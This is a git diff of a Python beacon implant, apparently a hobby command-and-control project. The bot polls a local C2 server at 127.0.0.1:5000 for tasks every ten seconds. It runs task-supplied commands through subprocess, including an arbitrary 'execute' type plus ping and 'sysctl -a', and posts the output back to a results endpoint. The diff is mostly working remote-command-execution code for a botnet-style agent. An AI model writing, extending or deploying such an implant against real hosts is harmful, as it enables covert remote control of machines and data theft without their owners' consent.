@@ -7,47 +7,58 @@ def fetch_next_task():
     return requests.get('http://127.0.0.1:5000/next_task')
 
 
-# Might rename this execute
-def parse_task(task):
-    print("PARSE")
+def build_command(task):
+    # builds a command from the task json
+    command = []
+    for key in task:
+        if key not in ["_id", "task_id", "task_type", "task_status"]:
+            print(f"{key}: {task[key]}")
+            command.append(task[key])
+    return command
+
+
+def parse_output(output):
+    # Remove new lines
+    output = output.decode('UTF-8')
+    print(f"parsed output: {output}")
+    print(type(output))
+    return output
+
+
+def execute_task(task):
     success = True
     command = []
     # Assume we have 4 task_types
     task_type = task["task_type"]
     if task_type == "ping":
         command.append(task_type)
-    # Filter out command args
-    for key in task:
-        if key not in ["_id", "task_id", "task_type", "task_status"]:
-            print(f"{key}: {task[key]}")
-            command.append(task[key])
-    print(f"command : {command}")
+        command.extend(build_command(task))
+    elif task_type == "proc":
+        # Needs formatting
+        command.append("sysctl")
+        command.append("-a")
+    elif task_type == "execute":
+        command = build_command(task)
     # Perform task
-    print("Performing Task...")
+    print(f"command : {command}")
+    print("[!] Performing Task...")
     process = subprocess.run(command, capture_output=True, timeout=30)
     if process.returncode != 0:
-        # Set success
-        print("error")
+        print("[!] error")
+        # std error
         success = False
-    print(process.stdout)
-    task_result = {"output": process.stdout, "success": success}
+        output = parse_output(process.stderr)
+    else:
+        output = parse_output(process.stdout)
+    task_result = {"output": output, "success": success}
+    return task_result
 
 
 def beacon_loop():
     print("Starting beacon loop")
-    # task_id = "88c695c6-bf9d-471d-bf31-37545c7ca3e3"
-    contents = "response from bot"
     success = True
-    # # --------------------------------------------------------------
-    # result = requests.post('http://127.0.0.1:5000/results', json=[
-    #     {
-    #         "task_id": task_id, "contents": contents, "success": success
-    #     }
-    # ])
-    # print(result.json())
-    # # --------------------------------------------------------------
     while True:
-        time.sleep(5)
+        time.sleep(10)
         print("Looping")
         # 1. Fetch next task
         task = fetch_next_task()
@@ -55,11 +66,15 @@ def beacon_loop():
         if task.status_code != 200:
             print(f"INFO: {json['error']}")
             continue
-        # 2. Parse Task
-        print(json)
-        parse_task(json)
-        # 3. Execute Task
-        pass
+        # 2. Execute Task
+        results = execute_task(json)
+        if not results["success"]:
+            # add the parsed message
+            contents = f"Execution of task \nid: \"{json['task_id']}\" \ntype \"{json['task_type']}\" failed. " \
+                       f"\noutput: {results['output']}"
+            success = False
+        else:
+            contents = results["output"]
         # 4. POST results
         result = requests.post('http://127.0.0.1:5000/results', json=[
             {
@@ -67,7 +82,6 @@ def beacon_loop():
             }
         ])
         print(f"POST Result {result}")
-        time.sleep(10)
 
 
 if __name__ == '__main__':
